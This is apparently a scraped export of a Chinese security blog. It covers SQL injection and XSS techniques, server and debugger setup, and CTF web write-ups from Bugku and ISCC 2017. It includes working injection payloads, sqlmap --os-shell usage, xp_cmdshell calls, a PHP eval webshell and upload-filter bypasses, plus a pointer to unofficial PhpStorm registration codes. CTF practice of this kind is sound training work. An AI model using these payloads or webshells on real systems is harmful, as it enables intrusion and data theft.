g.宽字节注入当MySQL使用宽字节编码时，会产生宽字节注入。若character_set_client=gbk时。输入%aa&#39;对单引号转义后变成%aa%5c%27,其中aa5c被mysql当成一个字符，导致单引号逃逸。可通过Mysql_query(&quot;SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary&quot;,$conn);来防御宽字节注入。 (1) character_set_client:客户端发送过来的SQL语句编码，也就是PHP发送的SQL查询语句编码字符集。 (2) character_set_connection:MySQL服务器接收客户端SQL查询语句后，在实施真正查询之前SQL查询语句编码字符集。 (3) character_set_results:SQL语句执行结果编码字符集。 mysql_real_escape_string和iconv()注入：参考 MySQL宽字节注入 by BlBana和宽字节注入 by lyiang。 h.堆叠注入用分号结束一条语句的执行，构造执行下一条任意语句。有其局限性。当采用mysql_query()执行sql语句时，多条sql语句将会报错，可使用mysqli::multi_query()。 例：sqlserver 中最为重要的存储过程的执行： 1select * from test where id=1;exec master..xp_cmdshell 'ipconfig' 注：oracle不支持多条语句执行 i. order by后的注入布尔盲注或延时注入： ?sort=(select ...) ?sort=rand(语句)。如rand(true/false)返回值不同，可利用rand盲注。 报错注入： ?sort=1&#39;and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+ procedure analyze()来执行报错注入。 导出文件： into outfile &#39;路径&#39;参数来导出结果。或使用lines terminated by 0x...来导出网马。 0x04 Tricksa. concat过滤下使用updatexml报错注入当concat函数被过滤且需要使用updatexml来报错注入时，可找类似函数，如lpad()、reverse()、repeat()、export_set()。（lpad()、reverse()、repeat() 这三个函数使用的前提是所查询的值中，必须至少含有一个特殊字符，否则会漏掉一些数据）。 b. linestring()爆当前表名通过polygon()和linestring()可爆出当前表名。还有multipoint、multilinestring、multipolygon： 12select * from user where proid=1 and polygon(proid);select * from user where proid=1 and linestring(proid); c. 通过join + using的方法来获取字段名：1select * from (select * from user as A join user as B using(pro_id)) as C; d. 通过联合查询，运用虚拟表在不出现字段名的情况下查出内容1select * from user where proid=-1 union select 1,a.1,3 from (select 1,2,3 from dual union select * from user)a; 0x05 sqlmap常用指令与参数 -u：后跟漏洞网站URL -r：从POST数据包中注入，后跟文件路径，注入点用*替换 -p：指定测试参数 --dbms：指定数据库系统类型 --technique=TECH：指定使用的注入方式 (default “BEUSTQ”) --dbs --tables --columns：枚举所有数据库、表、字段名 -D -T -C：指定数据库、表、字段名称 --dump：导出结果 --os-shell：系统交互 shell --sql-shell：SQL 交互 shell --level=LEVEL：指定注入测试的等级 (2级可检测cookie)(1-5, default 1) --risk=RISK：风险等级(1-3, default 1) --users：枚举数据库用户 --passwords：枚举数据库用户密码哈希值 --string,--not-string,--regexp,--code：提供字符串或者一段正则，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则）；在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。也可提供真与假条件返回的HTTP状态码不一样来注入。如，响应200的时候为真，响应401的时候为假，即--code=200。","tags":[{"name":"sql","slug":"sql","permalink":"K4ngx.github.io/tags/sql/"},{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"}]},{"title":"浅谈XSS","date":"2018-01-04T12:23:13.000Z","path":"2018/01/04/xss/","text":"0x01 XSS常见输出点 HTML标签之间 HTML标签之内 成为JavaScript代码的值（类似后文中输出在on*事件） 闭合引号 宽字节环境可采用宽字节注入或者&lt;/script&gt;闭合(高优先级) 成为CSS代码的值（类似后文中输出在style属性内） HTML标签之间1&lt;div id=\"body\"&gt;[输出]&lt;/div&gt; 注： 有些标签无法执行脚本，如&lt;title&gt;、&lt;textarea&gt;等 HTML标签之内 &lt;input type=&quot;text&quot; value=&quot;[输出]&quot; /&gt; 闭合属性，payload: &quot; onmouseover=&quot;alert(1);&quot; x=&quot; 闭合标签，payload: &quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt; 输出在src/href/action等属性内 javascript:伪协议，如javascript:alert(1)//,若/被过滤，可用JS逻辑与算数表达式代替，如alert(1)- data:伪协议（仅IE不支持） 伪协议不区分大小写 输出在on*事件内 具体判断输出作为on*事件的值或某个函数的参数值出现。 输出在style属性内 对IE，注入expression关键字并适当闭合 0x02 HTML和JavaScript自解码 输出的上下文环境为HTML时，可进行HTML形式的编码 进制编码：&amp;#xH;、&amp;#D; HTML实体编码：&amp;lt;等 输出的上下文环境为JavaScript时，可进行JavaScript编码 Unicode形式：\\uH 十六进制：\\xH 转义：\\&#39;、\\&quot;等 编码可参考 XSS字符编码与浏览器解析原理 0x03 具备HtmlEncode功能的标签 &lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;等具有HtmlEncode编码功能 &lt;xmp&gt;没有编码功能 &lt;plaintext&gt;在浏览器中存在差异 0x04 浏览器URL编码差异造成的XSS 对’”`&lt;&gt;的编码差异 对location.hash值的编码差异 0x05 HTML中的代码注入技巧标签 标签大小写不敏感 根据浏览器对XHTML的支持插入XML代码、SVG代码或未知标签 如在IE6可构造 &lt;XSS STYLE=&quot;xss:expression(alert(&#39;xss&#39;))&quot;&gt; 标签的优先级绕过过滤器 如&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;和注释&lt;!-- --&gt;或&lt;!-- --!&gt;具有高优先级。 对下面的代码，过滤器可能会认为&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;是属性href的值。 1&lt;!-- &lt;a href=\"--&gt;&lt;img src=x onerror=alert(1)//\"&gt;test&lt;/a&gt; 如&lt;! foo=&quot;&gt;&lt;script&gt;&lt;/script&gt;&quot;&gt; IE HTML 条件控制语句 如 &lt;!--[if IE 6]&gt;only IE6..test..&lt;![endif]--&gt; 如 &lt;!--[if &lt;img src=x onerror=alert(2)//]&gt; --&gt; &lt;svg&gt;标签下的&lt;script&gt;或其他CDATA元素会先进行XML解析,因此，可进行HTML实体编码或进制编码。 1&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&lt;/script&gt; 属性 属性大小写不敏感 IE中属性可用反引号包括 标签与属性、属性名与等号、等号与属性值之间可插入空格、换行符、回车符或Tab等。 在属性值的头部和尾部（引号内）插入控制字符（ASCII值1~32),如: 1&lt;a &amp;#8 href=\"&amp;#32javascript:alert(1)\"&gt;test&lt;/a&gt; 黑膜法：&lt;input type=&quot;image&quot; 0x06 CSS中代码注入技巧(大部分仅在IE低版本可用) 大小写不敏感 属性值对单双引号不敏感 资源类属性的URL部分对单双引号或无引号不敏感 空格可用tab、回车和换行符替代被浏览器解析 资源类属性中通过伪协议完成XSS利用,如： 1body&#123;background-image:url('jAvasCRipT:alert(1)');&#125; behavior引入一段含JS的代码片段，不能跨域。(IE) @import引入一段CSS代码 可在任意地方插入&#39;\\&#39;以及&#39;\\&#39;+0的组合（IE7及以下），如： 1@\\iMp\\00or\\0T \"url\"; IE8开始&#39;\\&#39;+0不可用，&#39;\\&#39;仍然可用。 expression(IE7及以下版本) 用注释混淆： 1body&#123;xs/*zzz*/s:ex/**/press/**/ion((window.x==1)?'':eval('x=1;alert(2);'));&#125; 在IE6下，可用全角字符混淆： 1body&#123;xss:exｐｒｅｓｓion((window.x==1)?'':eval('x=1;alert(2);'));&#125; 16进制编码： body{\\078\\073\\073:\\065\\078\\070\\072\\065\\073\\073\\069\\06f\\06e((window.x==1)?&#39;&#39;:eval(&#39;x=1;alert(2);&#39;));} utf-7编码： 1234@charset \"utf-7\";body&#123; aaa:e+AHgAcABy-e+AHMAcw-i+AG8-n+ACg-if+ACgAdw-ind+AG8AdwAuAHgAIQA9ADEAKQB7AGEAbA-e+AHIAdAAoADEAKQA7AHc-ind+AG8AdwAuAHgAPQAxADsAfQApADs-&#125;","tags":[{"name":"Web","slug":"Web","permalink":"K4ngx.github.io/tags/Web/"},{"name":"xss","slug":"xss","permalink":"K4ngx.github.io/tags/xss/"}]},{"title":"Ubuntu16.04搭建lnmp环境","date":"2018-01-01T17:26:43.000Z","path":"2018/01/02/lnmp/","text":"一劳永逸…… 安装Nginx根据官网的教程，在/etc/apt/sources.list文件中，添加以下两行，其中codename替换为对应系统版本的Codename12deb http://nginx.org/packages/ubuntu/ codename nginxdeb-src http://nginx.org/packages/ubuntu/ codename nginx 12sudo apt-get updatesudo apt-get install nginx 安装完后可用nginx -t来查找nginx配置文件所在路径。开启nginx服务：1sudo systemctl start nginx 安装php1sudo apt-get install php7.0 php7.0-fpm TCP配置方式建立nginx和php7.0-fpm的通信。 /etc/nginx/conf.d/default.conf部分：default.conf12345678location ~ \\.php$ &#123; root /var/www; fastcgi_pass 127.0.0.1:9000; #fastcgi_pass unix:/var/run/php/php7.0-fpm.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; &#125; /etc/php/7.0/fpm/pool.d/www.conf中php-fpm配置监听：www.conf12;listen = /run/php/php7.0-fpm.socklisten = 127.0.0.1:9000 安装MySQL5.71sudo apt-get install mysql-server-5.7 设置用户名密码后，启动12sudo systemctl start mysqlmysql -h 127.0.0.1 -uroot -proot","tags":[{"name":"noting","slug":"noting","permalink":"K4ngx.github.io/tags/noting/"}]},{"title":"利用Xdebug调试PHP程序（PhpStorm/Sublime3）","date":"2017-10-03T15:44:36.000Z","path":"2017/10/03/Xdebug/","text":"记录下分别在PhpStorm和sublime3中，用Xdebug来调试PHP程序的配置方法。 PhpStorm+chrome+VMware+docker+Xdebug扩展在虚拟机中设置共享文件夹虚拟机&gt;设置&gt;选项&gt;共享文件夹&gt;启用&gt;添加路径 注意：需要在虚拟机关闭的情况下启用和设置共享文件夹目录 即可在虚拟机的/mnt/hgfs目录下看到目标文件夹。把要调试的代码或文件夹放入主机的共享文件夹内。 docker中pull镜像，配置环境docker我是装在虚拟机里的:) 123456789101112$ docker pull php:5-apache$ docker pull mysql:5.5$ docker run -d --name cmsmysql \\ -v /home/ubuntu/workspace/datadir:/var/lib/mysql \\ -e MYSQL_ROOT_PASSWORD=root \\ mysql:5.5$ docker run -d --name cmsphp5.6 \\ -p 80:80 -p 9000:9000 \\ -v /mnt/hgfs/Workspace/PHP:/var/www/html \\ php:5-apache 执行docker exec -it cmsphp5.6 bash进入php容器中安装Xdebug扩展。 123$ pecl install xdebug-2.5.0$ docker-php-ext-enable xdebug$ apache2ctl restart 在cmsphp容器中添加/usr/local/etc/php/php.ini配置文件，之后重启Apache php.ini1234xdebug.remote_enable=1xdebug.remote_host=0.0.0.0xdebug.remote_connect_back=1xdebug.idekey=PHPSTORM 在chrome中下载Xdebug helper下载地址：Chrome应用商店Xdebug helper 调试时需要开启小瓢虫为绿色。 PhpStorm设置在Settings的Debug配置中，保证Debug port为9000，调试时需打开小电话，保持listening状态。 痛点虚拟机设置NAT模式时，访问不了主机的9000端口，无法进入调试。将网络配置还原成默认设置后，改成桥接，自动获取IP就成功了。 BTW： PhpStorm的注册码可在此获得 注册码领取入口 Sublime3+phpstudy+chromephpstudy下载下载phpstudy，phpstudy里自带了Xdebug的扩展，可以在其他选项菜单-&gt;PHP扩展及设置-&gt;PHP扩展里把”Xdebug”√上。在phpinfo中是否出现了Xdebug。 在sublime3中安装Xdebug Client看了网上的一些教程，看到某位sublime2使用者安装的是Xdebug而不是Xdebug Client，而我在sublime3的Install Package中只看到了Xdebug Client，于是就安装了（BTW：据说两者都安装会有冲突）。使用Ctrl+Alt+P键入Install Package,搜索Xdebug并安装。 chrome中配置Xdebug helper在IDE Key中选择other，然后输入sublime.xdebug,最后save。 使用 在chrome中打开要调试的地址，如localhost/test.php，然后启用Xdebug helper，会变绿 :) 在sublime里下断点，断点的快捷键为Ctrl+F8,其他的快捷键可以在Installed Packages\\Xdebug Client.sublime-package中的Default.sublime-keymap查看。 Ctrl+Shift+F9开启调试，在chrome中F5刷新。 在sublime中可看到变量信息等等。Ctrl+Shift+f5运行到下一个断点;Ctrl+Shift+f6单步;alt+shift+1退出debug。 Sublime配置Xdebug参考文档使用sublime2配合phpstudy+xdebug+chrome调试php Windows 下 Sublime Text 3 使用 Xdebug （配合Xdebug helper 插件） sublime 修改Xdebug插件快捷键","tags":[{"name":"nothing","slug":"nothing","permalink":"K4ngx.github.io/tags/nothing/"}]},{"title":"bugkuctf_web_writeup","date":"2017-09-30T06:53:00.000Z","path":"2017/09/30/bugkuctf-web-writeup/","text":"写完这个WP简直快吐。 Web2F12即可发现flag在注释中 文件上传测试这题对Content-Type和filename做了检查。上传一个jpg文件，burpsuite抓包将文件扩展改为php即可拿到flag。 计算题在Resource中找到code.js文件，发现flag。 Web3禁止弹窗后F12或在url开头加view-source:查看源代码，在结尾可发现一段HTML10进制的编码，解码后得到flag。 sql注入得知网页为gbk编码，采用宽字符注入。payload: 1/?id=1%aa%27union%20select%201,string%20from%20`key`%20where%20id=1%20%23 SQL注入1XSS过滤中过滤掉了尖括号，因此可用尖括号来绕过sql过滤。payload: 1/?id=1%20u&lt;&gt;nion%20s&lt;&gt;elect%201,hash%20f&lt;&gt;rom%20`key`%20where%20id=1%23 你必须让他停下查看源代码，多刷新几次可找到flag 本地包含payload: 1/?hello=1);show_source(%27flag.php%27 变量1通过超全局变量GLOBALS，即可拿到flag。 Web4查看源码，得到eval()函数里的代码为 1234567891011function checkSubmit()&#123; var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value) return!0; alert(\"Error\"); a.focus(); return!1; &#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit; 输入67d709b2b54aa2aa648cf6e87a7114f1即可拿到flag。 Web5jsfuck编码，直接丢console回车即可拿到flag。 flag在index中利用php://filter协议可得flag。payload:1?file=php://filter/read=convert.base64-encode/resource=index.php 12345678910111213141516&lt;!--index.php--&gt;&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo '&lt;a href=\"./index.php?file=show.php\"&gt;click me? no&lt;/a&gt;';&#125; $file=$_GET['file']; if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\"))&#123; echo \"Oh no!\"; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; phpcmsV9利用的是phpcmsV9.6.0的任意文件上传漏洞，下载phpcmsV9.6.0 getshell 工具上传小马，用菜刀连接，即可在Web根目录拿到flag.txt 海洋CMS海洋CMS 6.45代码执行漏洞。参考：seacms最新版前台getshell 访问flag32#.txt即可拿到flag。 输入密码查看flagburpsuite五位数字爆破即可。密码为13579。 前女友点击“链接”可看到源码，利用php弱类型和strcmp漏洞。传入?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=即可拿到flag。参考：php检查相等时的漏洞。 成绩单simple sqli。很常规，爆库爆表爆字段。根据id=2和id=2&#39; and 1=1#猜测sql语句为 1select * from foo where id='$_GET['id']' 测试id=-2&#39; union select 1,2,3,database()#成功显示库名为skctf_flag。 id=-2&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;skctf_flag&#39; limit x,1#(x=0,1,2...)得到表名为fl4g和sc。 id=-2&#39; union select 1,2,3,COLUMN_NAME from INFORMATION_SCHEMA.Columns where table_name=&#39;fl4g&#39; and table_schema=&#39;skctf_flag&#39;#得到字段名为skctf_flag。 id=-2&#39; union select 1,2,3,skctf_flag from fl4g#得到flag。 Web6注释让我们以margin为键名post提交我们所发现的东西。response header有flag，base64解码2次然后POST。保持session，将response中新的flag再经过base64解码2次再POST提交，得到flag。 123456789101112131415161718192021222324252627#python3.6from urllib import request, parseimport http.cookiejarimport base64str = \"TXpNeU9USXg=\" #经过一次base64解码后的flagurl = r\"http://120.24.86.145:8002/web6/\"str = int(base64.b64decode(base64.b64decode(str)).decode('ascii'))cookie = http.cookiejar.CookieJar()handler = request.HTTPCookieProcessor(cookie)opener = request.build_opener(handler)data = &#123;'margin':str&#125;pdata = parse.urlencode(data)binary_data = pdata.encode('ascii')con = opener.open(url,binary_data)str = con.getheader('flag')[44:56]str = int(base64.b64decode(base64.b64decode(str)).decode('ascii'))print(base64.b64decode(con.getheader('flag')).decode('utf-8'))print(con.read().decode('utf-8'))data = &#123;'margin':str&#125;pdata = parse.urlencode(data)binary_data = pdata.encode('ascii')con = opener.open(url,binary_data)print(con.read().decode('utf-8')) cookies欺骗？？将url中的filename改成aW5kZXgucGhw(index.php的base64编码)。编程遍历line参数（line=0,1,2…）得到index.php源码 1234import requestsfor i in range(20): r = requests.get(\"http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw\"%i) print(r.content.decode('utf8')) 12345678910111213141516171819202122//index.php&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; 添加cookie:margin=margin，打开/web11/index.php?line=0&amp;filename=a2V5cy5waHA得到flag。 XSS尖括号被过滤。payload: /?id=\\u003cimg%20src=%23%20onerror=alert(_key_)\\u003e never give up访问/test/1p.html抓包,拿到部分源码： 12345678910111213141516171819202122232425&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 直接访问/test/f4l2a3g.txt可拿到flag。（BTW：感觉是出题人疏忽了，正解应该是用php://伪协议和00截断） welcome to bugkuctf利用php伪协议可拿到index.php等等的源码 1234567891011121314151617181920212223242526272829303132333435//index.php&lt;?php $txt = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $password = $_GET[\"password\"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello friend!&lt;br&gt;\"; if(preg_match(\"/flag/\",$file))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; //解题关键 include($file); $password = unserialize($password); echo $password; &#125; &#125;else&#123; echo \"you are not the number of bugku ! \"; &#125; ?&gt; &lt;!-- $user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; --&gt; 1234567891011121314//hint.php&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo \"&lt;br&gt;\"; return (\"good\"); &#125; &#125; &#125; ?&gt; 因此，我们需要序列化一个Flag对象，且其变量file为flag.php。 login1注册一个admin+n个空格的帐号来覆盖管理员帐号。再用新密码登录admin即可拿到flag。 过狗一句话index.php便是提示中的assert一句话。找到flag.txt访问即可。 各种绕过哟sha1在处理数组的时候会warning并返回NULL。 Web8变量覆盖漏洞。访问/web8/?ac=test&amp;fn=php://input并POST数据test即可get flag。 字符？正则？payload: /?id=keykey1111key:/1/1keya.目测最短23位。 考细心访问robots.txt得到/resusl.php。在/resusl.php提交GET参数x=admin即可拿到flag 求getshell经过大佬们的提示，上传一个jpg，尝试把Content-Type的multipart/form-data;第一个字母m改成大写M。然后把文件名改成php5即可绕过。 flag.php提示hint,尝试了hint.php和hint.txt之后才知道要GET传参数hint得到源码。脑洞很大。 123456789101112131415161718192021222324252627282930313233343536//index.php&lt;?php error_reporting(0); include_once(\"flag.php\"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === \"$KEY\") &#123; echo \"$flag\"; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=\"container\" align=\"center\"&gt; &lt;form method=\"POST\" action=\"#\"&gt; &lt;p&gt;&lt;input name=\"user\" type=\"text\" placeholder=\"Username\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=\"password\" type=\"password\" placeholder=\"Password\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=\"Login\" type=\"button\"/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt; 然而这题有一个坑点，变量$KEY是定义在代码的末尾的。因此在前面将反序列化之后的$cookie与$KEY相比较时，$KEY的值是为NULL的。所以我们要传入的$cookie应该是serialize(&quot;&quot;); 因此，添加Cookie: ISecer=s:0:&quot;&quot;;即可拿到flag。 文件包含2本来以为一发php://filter入魂。没想到”NAIVE”了。F12提示upload.php。上传一个带php一句话的jpg，利用file参数本地包含，发现php标签被过滤成了下划线。尝试 1&lt;script language=\"php\"&gt;@eval($_POST['a']);var_dump(1);&lt;/script&gt; 成功显示int(1),菜刀连接即可看到flag文件。 wordpress查看SUN的文章，可发现一个生日。构造字典爆破得用户名为SUN,密码为sun19980321。登录后有一篇私人日志,大佬提示之后才知道是数据库的帐号密码。。。 wp wzTrzYRdbrbyjAx BTW.由于题目环境被破坏，无法复现截图:( 访问/phpmyadmin。登录之后可看到flag表，拿到flag。","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"ISCC_2017_Web_writeup","date":"2017-05-25T03:55:54.000Z","path":"2017/05/25/ISCC-2017-Web-writeup/","text":"Web签到题，来和我换flag啊！POST提交三个f1ag，可在response中拿到flag。 WelcomeToMySQLF12发现数据库信息在../base.php。上传php5 123&lt;?phpshow_source(\"../base.php\");?&gt; 访问upload/xxx.php可拿到base.php源码。再上传一个php5连接数据库可拿到flag。 123456&lt;?php$conn = mysql_connect(\"localhost\", \"iscc2017\", \"iscc2017\");mysql_select_db(\"flag\",$conn);$result = mysql_query(\"select * from flag\");var_dump(mysql_fetch_row($result));?&gt; where is your flag访问flag.php发现hint:thisisflag。可知在表flag中有字段名为thisisflag。尝试GET请求id=1，页面返回正常;请求id=2-1，返回空白页面，可猜测，sql语句为 1SELECT * FROM foobar where id='$_GET['id']' 测试可知为宽字节注入,且需要转换编码为gbk: 我们一起来日站尝试访问robots.txt,发现Disallow: /21232f297a57a5a743894a0e4a801fc3/，提示keep finding admin page，访问/admin.php进入后台登录界面。简单注入：username为admin，passwd为&#39;or 1#拿到flag。 自相矛盾F12拿到部分源码 123456789101112131415161718192021222324252627282930313233$v1=0;$v2=0;$v3=0;$a=(array)json_decode(@$_GET['iscc']); if(is_array($a))&#123; is_numeric(@$a[\"bar1\"])?die(\"nope\"):NULL; if(@$a[\"bar1\"])&#123; ($a[\"bar1\"]&gt;2016)?$v1=1:NULL; &#125; if(is_array(@$a[\"bar2\"]))&#123; if(count($a[\"bar2\"])!==5 OR !is_array($a[\"bar2\"][0])) die(\"nope\"); $pos = array_search(\"nudt\", $a[\"bar2\"]); $pos===false?die(\"nope\"):NULL; foreach($a[\"bar2\"] as $key=&gt;$val)&#123; $val===\"nudt\"?die(\"nope\"):NULL; &#125; $v2=1; &#125; &#125;$c=@$_GET['cat'];$d=@$_GET['dog'];if(@$c[1])&#123; if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123; eregi(\"3|1|c\",$d.$c[0])?die(\"nope\"):NULL; strpos(($c[0].$d), \"isccctf2017\")?$v3=1:NULL; &#125; &#125;if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; echo $flag;&#125; 其中$v2中的array_search()绕过参考了某个大佬的博客：array_search()绕过。$v3中正则的绕过采用%00截断。 Simple sqli验证码要求md5加密后前三位等于一个随机字符串，于是可以写个脚本爆破出符合要求的验证码： 123456789#python3.6import hashlibsub = \"随机字符串\"for i in range(100000): if hashlib.md5(str(i).encode('utf8')).hexdigest().startswith(sub): print(i) break 测试发现，当Username为admin和&#39; or 1#时显示password error. 输入不存在的Username或者sql语法错误时显示username error. 输入&#39;union select 1亦显示password error. 可以猜测sql语句为： 1SELECT password FROM foobar WHERE username='' 然后将查询结果与用户输入的md5加密后的password进行比较。 于是可以令Username=&#39; union select md5(1)#,Password=1,即可拿到Flag。 I have a jpg,i upload a txt.题目过滤了php标签和script标签。当传入$do=rename时，调用了一个KaIsA()函数，测试后发现大写字母为ascii+6，小写为ascii-6，函数代码如下： 12345678910111213141516171819#python3.6a = 'base64加密后的字符串'b = ''for i in a: if i.isupper(): i = ord(i)+6 if i&gt;90: i = chr(i-26) else: i = chr(i) elif i.islower(): i = ord(i)-6 if i&lt;97: i = chr(i+26) else: i = chr(i) b += i print(b) 观察源码发现，rename过程中新生成的随机文件名的txt是唯一的，因此可以尝试上传两个使用php短标签的文件，拼成一个txt文件，再更改后缀为php。 上传的两个文件分别为： 123&lt; //1.txt? eval($_GET['a']); ?&gt; //2.txt 经过两次的rename过程，可以得到一个随机文件名的php，访问upload/xxxxxx.php会跳转到flaggalf.php，抓包可得flag","tags":[{"name":"writeup","slug":"writeup","permalink":"K4ngx.github.io/tags/writeup/"}]},{"title":"用Hexo和Github搭建blog","date":"2017-05-14T15:14:33.000Z","path":"2017/05/14/hexo/","text":"这两天花了点时间在Ubuntu16.04的服务器上用Hexo的框架搭了个blog。总的来说，搭建的速度还是非常快的。然而过程中还是遇到了不少的坑，在此记录一下。 Git 、Node.js和Hexo的安装Git的安装不用多说，一条命令就OK。 1$ sudo apt-get install git-core 而Node.js要使用nvm来安装，Hexo官方教程给了两条命令。 12$ curl https://raw.github.com/creationix/nvm/master/install.sh | sh$ wget -qO- https://raw.github.com/creationix/nvm/master/install.sh | sh 第一条命令尝试了几次发现都失败了，而第二条命令成功了，然而这不是重点。重点是在nvm安装成功之后在输入nvm命令时却显示 1zsh: command not found: nvm 在多次搜索后,发现要在~/.zshrc(bash是~/.bashrc)里添上 1[ -s $HOME/.nvm/nvm.sh ] &amp;&amp; . $HOME/.nvm/nvm.sh 然后就可以安装Node.js了 1$ nvm install stable Git和Node.js安装完后，就可以安装Hexo了 1$ npm install -g hexo-cli hexo d命令报错在使用hexo d命令时，可能会遇到ERROR Deployer not found: git的错误，输入以下代码即可 1$ npm install hexo-deployer-git --save 域名的绑定由于是利用github来搭建的静态网站，刚搭建好博客时，需要通过github的域名来访问。然而，当然是用自己的域名来访问更爽一点。 域名提供商首先要在域名提供商（我这里是腾讯云）那边添加一条CNAME记录，将CNAME指向your_username.github.io 在博客里添加CNAME文件进入博客目录，在source文件夹下创建一个名为CNAME的文件，输入你的域名: 如 blog.cnt2x.cn 坑！Github的Custom domain设置这个地方折磨了我挺久，上面两个步骤设置完了之后，我访问我的博客永远都是404，找了好久的问题。后来在某篇文章中发现，在Github里仓库的setting，在下方有一个Custom domain的设置，输入你要绑定的域名，然后save，就可以进入博客了。","tags":[{"name":"noting","slug":"noting","permalink":"K4ngx.github.io/tags/noting/"}]}]